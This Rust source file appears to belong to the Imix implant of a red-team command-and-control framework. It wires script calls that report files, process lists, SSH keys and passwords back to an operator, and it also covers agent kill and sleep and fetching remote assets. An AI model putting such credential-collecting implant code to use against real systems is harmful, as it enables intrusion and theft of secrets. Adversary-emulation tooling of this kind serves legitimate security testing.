use alloc::collections::BTreeMap;
use alloc::string::String;
use alloc::vec::Vec;
use eldritch_core::Value;
use eldritch_macros::eldritch_library_impl;
use eldritch_stdlib::{
    agent::AgentLibrary,
    assets::AssetsLibrary,
    report::ReportLibrary,
};
use pb::{
    eldritch::{Process, ProcessList, process::Status},
};
use tokio::sync::mpsc::UnboundedSender;
use tokio::sync::oneshot;

extern crate alloc;

use crate::actions::ImixAction;

// Use tokio::task_local to store the sender for the current task
tokio::task_local! {
    pub static ACTION_SENDER: UnboundedSender<ImixAction>;
    pub static TASK_ID: i64;
}

#[derive(Default, Debug)]
#[eldritch_library_impl(ReportLibrary)]
pub struct ImixReportLibrary;

impl ReportLibrary for ImixReportLibrary {
    fn file(&self, path: String) -> Result<(), String> {
        let task_id = TASK_ID.try_with(|id| *id).unwrap_or(0);
        let action = ImixAction::ReportFile(task_id, path);
        ACTION_SENDER.try_with(|sender| {
            sender.send(action).map_err(|e| format!("Failed to send action: {}", e))
        }).map_err(|_| "Action sender not available".to_string())??;
        Ok(())
    }

    fn process_list(&self, list: Vec<BTreeMap<String, Value>>) -> Result<(), String> {
        let task_id = TASK_ID.try_with(|id| *id).unwrap_or(0);

        let mut pb_list = Vec::new();
        for proc_map in list {
            let pid = proc_map.get("pid").and_then(|v| match v { Value::Int(i) => Some(*i as u64), _ => None }).unwrap_or(0);
            let ppid = proc_map.get("ppid").and_then(|v| match v { Value::Int(i) => Some(*i as u64), _ => None }).unwrap_or(0);
            let name = proc_map.get("name").and_then(|v| match v { Value::String(s) => Some(s.clone()), _ => None }).unwrap_or_default();
            let principal = proc_map.get("owner").and_then(|v| match v { Value::String(s) => Some(s.clone()), _ => None }).unwrap_or_default();
            let cmd = proc_map.get("cmd").and_then(|v| match v { Value::String(s) => Some(s.clone()), _ => None }).unwrap_or_default();
            // Process doesn't seem to have architecture in protobuf definition I saw, checking error message:
            // available fields: `principal`, `cmd`, `cwd`, `status`

            let cwd = proc_map.get("cwd").and_then(|v| match v { Value::String(s) => Some(s.clone()), _ => None }).unwrap_or_default();

            pb_list.push(Process {
                pid,
                ppid,
                name,
                principal,
                path: String::new(), // Populate if available
                cmd,
                env: String::new(), // Populate if available
                cwd,
                status: Status::Unknown as i32,
            });
        }

        let action = ImixAction::ReportProcessList(task_id, ProcessList { list: pb_list });

        ACTION_SENDER.try_with(|sender| {
            sender.send(action).map_err(|e| format!("Failed to send action: {}", e))
        }).map_err(|_| "Action sender not available".to_string())??;

        Ok(())
    }

    fn ssh_key(&self, username: String, key: String) -> Result<(), String> {
        // Map to ReportCredential logic if needed, or ReportText for now
        let task_id = TASK_ID.try_with(|id| *id).unwrap_or(0);
        let text = format!("SSH Key for {}: {}", username, key);
        let action = ImixAction::ReportText(task_id, text);
        ACTION_SENDER.try_with(|sender| {
            sender.send(action).map_err(|e| format!("Failed to send action: {}", e))
        }).map_err(|_| "Action sender not available".to_string())??;
        Ok(())
    }

    fn user_password(&self, username: String, password: String) -> Result<(), String> {
        let task_id = TASK_ID.try_with(|id| *id).unwrap_or(0);
        let text = format!("Password for {}: {}", username, password);
        let action = ImixAction::ReportText(task_id, text);
        ACTION_SENDER.try_with(|sender| {
            sender.send(action).map_err(|e| format!("Failed to send action: {}", e))
        }).map_err(|_| "Action sender not available".to_string())??;
        Ok(())
    }
}

#[derive(Default, Debug)]
#[eldritch_library_impl(AgentLibrary)]
pub struct ImixAgentLibrary;

impl AgentLibrary for ImixAgentLibrary {
    fn get_config(&self) -> Result<BTreeMap<String, Value>, String> {
        Err("get_config not implemented".to_string())
    }

    fn get_id(&self) -> Result<String, String> {
        Ok("unknown".to_string())
    }

    fn get_platform(&self) -> Result<String, String> {
        Ok(std::env::consts::OS.to_string())
    }

    fn kill(&self) -> Result<(), String> {
        let action = ImixAction::Kill;
        ACTION_SENDER.try_with(|sender| {
            sender.send(action).map_err(|e| format!("Failed to send action: {}", e))
        }).map_err(|_| "Action sender not available".to_string())??;
        Ok(())
    }

    fn set_config(&self, _config: BTreeMap<String, Value>) -> Result<(), String> {
        Err("set_config not implemented".to_string())
    }

    fn sleep(&self, secs: i64) -> Result<(), String> {
        std::thread::sleep(std::time::Duration::from_secs(secs as u64));
        Ok(())
    }
}

#[derive(Default, Debug)]
#[eldritch_library_impl(AssetsLibrary)]
pub struct ImixAssetsLibrary;

impl AssetsLibrary for ImixAssetsLibrary {
    fn get(&self, name: String) -> Result<Vec<u8>, String> {
        let (tx, rx) = oneshot::channel();
        let action = ImixAction::FetchAsset(name, tx);

        ACTION_SENDER.try_with(|sender| {
            sender.send(action).map_err(|e| format!("Failed to send action: {}", e))
        }).map_err(|_| "Action sender not available".to_string())??;

        futures::executor::block_on(rx)
            .map_err(|e| format!("Failed to receive asset: {}", e))?
            .map_err(|e| format!("Asset fetch failed: {}", e))
    }

    fn list(&self) -> Result<Vec<String>, String> {
        Err("list assets not implemented".to_string())
    }
}
